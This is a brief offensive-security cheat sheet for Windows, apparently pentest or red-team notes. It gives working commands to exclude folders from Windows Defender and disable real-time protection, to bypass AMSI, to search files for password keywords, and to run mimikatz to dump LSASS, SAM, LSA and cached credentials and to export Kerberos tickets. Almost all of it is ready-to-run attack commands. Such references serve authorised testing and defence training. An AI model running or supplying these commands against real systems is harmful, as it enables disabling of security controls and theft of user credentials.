## Disable Antivirus  
### With Admin privileges  
Add a folder to the list of paths for which Windows Defender scheduled and real-time scanning is disabled:  
`PS C:\> Add-MpPreference –ExclusionPath “C:\Temp\User"`
  
Disable real-time protection:  
`PS C:\> Set-MpPreference –DisableRealtimeMonitoring $True`  

Some AMSI (Antimalware scan interface) bypass techniques:  
- `PS C:\> powershell.exe –version 2` (Downgrade to PowerShell 2.0 (.NET Framework 3.5 is required)  
- Crash the AMSI process by running payloads available « amsi.fail » (https://amsi.fail).  
  
## Search passwords  
### Enumerate local secrets by searching for keywords in files  
`Get-ChildItem -Path C:\* -Include *.xml,*.ini,*.txt,*.config,*.ps1,*.bat, *.properties,*.cfg,*.vbs,*.wsf,*.cmd -ErrorAction SilentlyContinue -Recurse | Select-String "adm","<domain>","pass","pwd","mdp","cred","config","username","SecureString" -List | Select-Object -ExpandProperty Path`  

    
### With Admin privileges - Extract passwords  
`mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"`  
  
**Explanation :**  
`privilege::debug` & `token::elevate` Elevate Privileges to extract the credentials  
`sekurlsa::logonpasswords` Extracts creds from lsass (memory)  
`lsadump::lsa /inject` Extracts from lsass (service)  
`lsadump::sam` Extracts creds from SAM  

## Extract Kerberos tickets from memory  
### With Admin privileges 
   
`mimikatz.exe "privilege::debug" "token::elevate" "kerberos::list /export" "exit"`    
  
